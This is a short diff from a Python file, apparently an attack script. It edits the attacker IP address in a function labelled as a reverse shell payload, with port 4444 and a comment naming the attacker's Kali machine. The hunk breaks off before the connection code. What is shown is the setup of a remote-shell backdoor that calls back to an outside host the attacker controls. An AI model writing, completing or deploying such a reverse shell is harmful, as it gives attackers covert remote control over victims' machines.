@@ -8,7 +8,7 @@ import threading
 # ---- REVERSE SHELL PAYLOAD ----
 def reverse_shell():
     # Attacker's IP and Port (your Kali machine)
-    ATTACKER_IP = "223.181.59.55"  # Your Kali IP
+    ATTACKER_IP = "142.93.23.15"  # Your Kali IP
     ATTACKER_PORT = 4444
     
     try:
